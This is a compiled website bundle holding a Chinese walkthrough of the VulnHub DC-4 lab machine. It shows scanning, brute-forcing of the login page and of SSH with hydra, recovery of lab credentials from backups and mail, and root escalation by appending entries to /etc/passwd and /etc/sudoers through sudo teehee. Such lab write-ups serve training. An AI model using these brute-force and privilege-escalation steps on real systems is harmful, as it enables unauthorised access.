"use strict";(self.webpackChunkremote_website=self.webpackChunkremote_website||[]).push([[1720],{3442:(n,e,r)=>{r.r(e),r.d(e,{assets:()=>d,contentTitle:()=>t,default:()=>h,frontMatter:()=>l,metadata:()=>s,toc:()=>a});const s=JSON.parse('{"id":"VulnHub/Virtual Machines/DC-4","title":"DC-4","description":"\u4e3b\u673a\u626b\u63cf","source":"@site/docs/VulnHub/Virtual Machines/DC-4.md","sourceDirName":"VulnHub/Virtual Machines","slug":"/VulnHub/Virtual Machines/DC-4","permalink":"/docs/VulnHub/Virtual Machines/DC-4","draft":false,"unlisted":false,"editUrl":"https://github.com/C0rr3c7/C0rr3c7.github.io/tree/master/docs/VulnHub/Virtual Machines/DC-4.md","tags":[],"version":"current","frontMatter":{},"sidebar":"VulnHubSidebar","previous":{"title":"DC-3","permalink":"/docs/VulnHub/Virtual Machines/DC-3"},"next":{"title":"DC-5","permalink":"/docs/VulnHub/Virtual Machines/DC-5"}}');var i=r(4848),c=r(8453);const l={},t="DC-4",d={},a=[{value:"\u4e3b\u673a\u626b\u63cf",id:"\u4e3b\u673a\u626b\u63cf",level:2},{value:"\u7aef\u53e3\u626b\u63cf",id:"\u7aef\u53e3\u626b\u63cf",level:2},{value:"\u76ee\u5f55\u626b\u63cf",id:"\u76ee\u5f55\u626b\u63cf",level:2},{value:"\u8bbf\u95eeweb\u9875\u9762",id:"\u8bbf\u95eeweb\u9875\u9762",level:2},{value:"\u7206\u7834\u767b\u5f55\u9875\u9762",id:"\u7206\u7834\u767b\u5f55\u9875\u9762",level:3},{value:"\u7206\u7834SSH",id:"\u7206\u7834ssh",level:3},{value:"\u63d0\u6743",id:"\u63d0\u6743",level:2},{value:"\u603b\u7ed3",id:"\u603b\u7ed3",level:2}];function o(n){const e={blockquote:"blockquote",code:"code",h1:"h1",h2:"h2",h3:"h3",header:"header",img:"img",p:"p",pre:"pre",...(0,c.R)(),...n.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(e.header,{children:(0,i.jsx)(e.h1,{id:"dc-4",children:"DC-4"})}),"\n",(0,i.jsx)(e.h2,{id:"\u4e3b\u673a\u626b\u63cf",children:"\u4e3b\u673a\u626b\u63cf"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"arp-scan -l\n"})}),"\n",(0,i.jsxs)(e.blockquote,{children:["\n",(0,i.jsx)(e.p,{children:"\u9776\u673aip\uff1a192.168.56.110"}),"\n"]}),"\n",(0,i.jsx)(e.h2,{id:"\u7aef\u53e3\u626b\u63cf",children:"\u7aef\u53e3\u626b\u63cf"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"nmap -A 192.168.56.110\n"})}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-15 07:08 EDT\r\nNmap scan report for 192.168.56.110\r\nHost is up (0.0011s latency).\r\nNot shown: 998 closed tcp ports (reset)\r\nPORT   STATE SERVICE VERSION\r\n22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)\r\n| ssh-hostkey: \r\n|   2048 8d:60:57:06:6c:27:e0:2f:76:2c:e6:42:c0:01:ba:25 (RSA)\r\n|   256 e7:83:8c:d7:bb:84:f3:2e:e8:a2:5f:79:6f:8e:19:30 (ECDSA)\r\n|_  256 fd:39:47:8a:5e:58:33:99:73:73:9e:22:7f:90:4f:4b (ED25519)\r\n80/tcp open  http    nginx 1.15.10\r\n|_http-title: System Tools\r\n|_http-server-header: nginx/1.15.10\r\nMAC Address: 08:00:27:8A:84:D7 (Oracle VirtualBox virtual NIC)\r\nDevice type: general purpose\r\nRunning: Linux 3.X|4.X\r\nOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4\r\nOS details: Linux 3.2 - 4.9\r\nNetwork Distance: 1 hop\r\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n"})}),"\n",(0,i.jsx)(e.h2,{id:"\u76ee\u5f55\u626b\u63cf",children:"\u76ee\u5f55\u626b\u63cf"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"dirsearch -u http://192.168.56.110\n"})}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"Target: http://192.168.56.110/\r\n\r\n[07:12:12] Starting: \r\n[07:12:40] 302 -  704B  - /command.php  ->  index.php\r\n[07:12:42] 301 -  170B  - /css  ->  http://192.168.56.110/css/\r\n[07:12:52] 301 -  170B  - /images  ->  http://192.168.56.110/images/\r\n[07:12:52] 403 -  556B  - /images/\r\n[07:12:52] 403 -   15B  - /index.pHp\r\n[07:12:57] 302 -  206B  - /login.php  ->  index.php\r\n[07:12:58] 302 -  163B  - /logout.php  ->  index.php\n"})}),"\n",(0,i.jsx)(e.h2,{id:"\u8bbf\u95eeweb\u9875\u9762",children:"\u8bbf\u95eeweb\u9875\u9762"}),"\n",(0,i.jsx)(e.h3,{id:"\u7206\u7834\u767b\u5f55\u9875\u9762",children:"\u7206\u7834\u767b\u5f55\u9875\u9762"}),"\n",(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240315191803905.png",alt:"image-20240315191803905"})}),"\n",(0,i.jsxs)(e.blockquote,{children:["\n",(0,i.jsx)(e.p,{children:"admin happy"}),"\n"]}),"\n",(0,i.jsx)(e.p,{children:"\u8fdb\u5230\u540e\u53f0\uff0c\u53d1\u73b0\u53ef\u4ee5\u6267\u884c\u547d\u4ee4"}),"\n",(0,i.jsx)(e.p,{children:"\u76f4\u63a5\u53cd\u5f39shell"}),"\n",(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240315192253431.png",alt:"image-20240315192253431"})}),"\n",(0,i.jsx)(e.p,{children:"\u67e5\u627esuid\u6743\u9650\u7684\u6587\u4ef6"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"www-data@dc-4:/home$ find / -type f -perm -4000 2>/dev/null\r\nfind / -type f -perm -4000 2>/dev/null\r\n/usr/bin/gpasswd\r\n/usr/bin/chfn\r\n/usr/bin/sudo\r\n/usr/bin/chsh\r\n/usr/bin/newgrp\r\n/usr/bin/passwd\r\n/usr/lib/eject/dmcrypt-get-device\r\n/usr/lib/openssh/ssh-keysign\r\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\r\n/usr/sbin/exim4\r\n/bin/mount\r\n/bin/umount\r\n/bin/su\r\n/bin/ping\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u8fd9\u91ccexim4\u662f\u6709\u6f0f\u6d1e\u7684\uff0c\u548cdc-8\u7684\u4e00\u6837"}),"\n",(0,i.jsx)(e.p,{children:"\u6211\u8fd9\u91cc\u8ddf\u7740\u9776\u673a\u601d\u8def\u518d\u505a\u4e00\u904d"}),"\n",(0,i.jsx)(e.p,{children:"\u8fdb\u5230home\u76ee\u5f55"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-shell",children:"www-data@dc-4:/home/jim$ ls -la\r\nls -la\r\ntotal 36\r\ndrwxr-xr-x 3 jim  jim  4096 Mar 12 21:37 .\r\ndrwxr-xr-x 5 root root 4096 Apr  7  2019 ..\r\n-rw-r--r-- 1 jim  jim   220 Apr  6  2019 .bash_logout\r\n-rw-r--r-- 1 jim  jim  3526 Apr  6  2019 .bashrc\r\n-rw-r--r-- 1 jim  jim   675 Apr  6  2019 .profile\r\ndrwxr-xr-x 2 jim  jim  4096 Apr  7  2019 backups\r\n-rw------- 1 jim  jim   528 Apr  6  2019 mbox\r\n-rwxrwxrwx 1 jim  jim    22 Mar 12 21:25 test.sh\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u53d1\u73b0\u5bc6\u7801\u6587\u4ef6"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-shell",children:"www-data@dc-4:/home/jim$ cd backups\r\ncd backups\r\nwww-data@dc-4:/home/jim/backups$ ls\r\nls\r\nold-passwords.bak\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u53ef\u80fd\u662fjim\u7684\u5bc6\u7801"}),"\n",(0,i.jsx)(e.h3,{id:"\u7206\u7834ssh",children:"\u7206\u7834SSH"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"hydra -l jim -P pass.txt ssh://192.168.56.110\n"})}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"[22][ssh] host: 192.168.56.110   login: jim   password: jibril04\n"})}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-shell",children:'jim@dc-4:~$ cat mbox\r\ncat mbox\r\nFrom root@dc-4 Sat Apr 06 20:20:04 2019\r\nReturn-path: <root@dc-4>\r\nEnvelope-to: jim@dc-4\r\nDelivery-date: Sat, 06 Apr 2019 20:20:04 +1000\r\nReceived: from root by dc-4 with local (Exim 4.89)\r\n        (envelope-from <root@dc-4>)\r\n        id 1hCiQe-0000gc-EC\r\n        for jim@dc-4; Sat, 06 Apr 2019 20:20:04 +1000\r\nTo: jim@dc-4\r\nSubject: Test\r\nMIME-Version: 1.0\r\nContent-Type: text/plain; charset="UTF-8"\r\nContent-Transfer-Encoding: 8bit\r\nMessage-Id: <E1hCiQe-0000gc-EC@dc-4>\r\nFrom: root <root@dc-4>\r\nDate: Sat, 06 Apr 2019 20:20:04 +1000\r\nStatus: RO\r\n\r\nThis is a test.\n'})}),"\n",(0,i.jsx)(e.h2,{id:"\u63d0\u6743",children:"\u63d0\u6743"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-shell",children:'jim@dc-4:~$ cd /var/mail\r\ncd /var/mail\r\njim@dc-4:/var/mail$ ls\r\nls\r\njim  www-data\r\njim@dc-4:/var/mail$ cat jim\r\ncat jim\r\nFrom charles@dc-4 Sat Apr 06 21:15:46 2019\r\nReturn-path: <charles@dc-4>\r\nEnvelope-to: jim@dc-4\r\nDelivery-date: Sat, 06 Apr 2019 21:15:46 +1000\r\nReceived: from charles by dc-4 with local (Exim 4.89)\r\n        (envelope-from <charles@dc-4>)\r\n        id 1hCjIX-0000kO-Qt\r\n        for jim@dc-4; Sat, 06 Apr 2019 21:15:45 +1000\r\nTo: jim@dc-4\r\nSubject: Holidays\r\nMIME-Version: 1.0\r\nContent-Type: text/plain; charset="UTF-8"\r\nContent-Transfer-Encoding: 8bit\r\nMessage-Id: <E1hCjIX-0000kO-Qt@dc-4>\r\nFrom: Charles <charles@dc-4>\r\nDate: Sat, 06 Apr 2019 21:15:45 +1000\r\nStatus: O\r\n\r\nHi Jim,\r\n\r\nI\'m heading off on holidays at the end of today, so the boss asked me to give you my password just in case anything goes wrong.\r\n\r\nPassword is:  ^xHhA&hvim0y\r\n\r\nSee ya,\r\nCharles\r\n\r\njim@dc-4:/var/mail$ sudo -l\r\nsudo -l\r\n[sudo] password for jim: ^xHhA&hvim0y\r\n\r\nSorry, try again.\r\n[sudo] password for jim: jibril04\r\n\r\nSorry, user jim may not run sudo on dc-4.\n'})}),"\n",(0,i.jsxs)(e.blockquote,{children:["\n",(0,i.jsx)(e.p,{children:"\u5f97\u5230Charles\u7684\u767b\u5f55\u5bc6\u7801\uff0c^xHhA&hvim0y"}),"\n"]}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-shell",children:"charles@dc-4:~$ sudo -l\r\nsudo -l\r\nMatching Defaults entries for charles on dc-4:\r\n    env_reset, mail_badpass,\r\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\r\n\r\nUser charles may run the following commands on dc-4:\r\n    (root) NOPASSWD: /usr/bin/teehee\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u53ef\u4ee5\u7528teehee\u547d\u4ee4"}),"\n",(0,i.jsx)(e.p,{children:"\u770b\u4e00\u4e0bteehee\u7684\u624b\u518c"}),"\n",(0,i.jsxs)(e.blockquote,{children:["\n",(0,i.jsx)(e.p,{children:"\u7528\u6cd5\uff1ateehee [\u9009\u9879] ... [\u6587\u4ef6] ..."}),"\n",(0,i.jsx)(e.p,{children:"\u5c06\u6807\u51c6\u8f93\u5165\u590d\u5236\u5230\u6bcf\u4e2aFILE\uff0c\u4e5f\u590d\u5236\u5230\u6807\u51c6\u8f93\u51fa\u3002"}),"\n",(0,i.jsx)(e.p,{children:"-a\u3001 --\u9644\u52a0\u5230\u7ed9\u5b9a\u7684FILEs\uff0c\u4e0d\u8986\u76d6"}),"\n",(0,i.jsx)(e.p,{children:"-i\u3001 --\u5ffd\u7565\u4e2d\u65ad\u5ffd\u7565\u4e2d\u65ad\u4fe1\u53f7"}),"\n",(0,i.jsx)(e.p,{children:"-p\u8bca\u65ad\u5199\u5165\u975e\u7ba1\u9053\u7684\u9519\u8bef"}),"\n"]}),"\n",(0,i.jsx)(e.p,{children:"\u5229\u7528\u7ba1\u9053\u5199\u8fdb\u6587\u4ef6"}),"\n",(0,i.jsx)(e.p,{children:"\u53ef\u4ee5\u5199/etc/passwd\u6216\u8005/etc/sudoers"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:'echo "root1::0:0:::/bin/bash" | sudo teehee -a /etc/passwd\r\nsu - root1\n'})}),"\n",(0,i.jsx)(e.p,{children:"\u6216\u8005"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:'echo "charles   ALL=(ALL:ALL) ALL" | sudo teehee -a /etc/sudoers\r\nsudo su -\n'})}),"\n",(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240315195417005.png",alt:"image-20240315195417005"})}),"\n",(0,i.jsx)(e.h2,{id:"\u603b\u7ed3",children:"\u603b\u7ed3"}),"\n",(0,i.jsxs)(e.blockquote,{children:["\n",(0,i.jsx)(e.p,{children:"\u4e3b\u8981\u8003\u5bdf\u7206\u7834\uff0cssh\u7206\u7834\uff0c\u767b\u5f55\u9875\u9762\u7206\u7834"}),"\n",(0,i.jsx)(e.p,{children:"\u9776\u673a\u6d89\u53ca\u77e5\u8bc6\u70b9\uff1a"}),"\n",(0,i.jsx)(e.p,{children:"\u7206\u7834\uff0cteeheee\u63d0\u6743\uff0c/etc/passwd\uff0c/etc/sudoers\u6587\u4ef6\u5229\u7528"}),"\n"]})]})}function h(n={}){const{wrapper:e}={...(0,c.R)(),...n.components};return e?(0,i.jsx)(e,{...n,children:(0,i.jsx)(o,{...n})}):o(n)}},8453:(n,e,r)=>{r.d(e,{R:()=>l,x:()=>t});var s=r(6540);const i={},c=s.createContext(i);function l(n){const e=s.useContext(c);return s.useMemo((function(){return"function"==typeof n?n(e):{...e,...n}}),[e,n])}function t(n){let e;return e=n.disableParentContext?"function"==typeof n.components?n.components(i):n.components||i:l(n.components),s.createElement(c.Provider,{value:e},n.children)}}}]);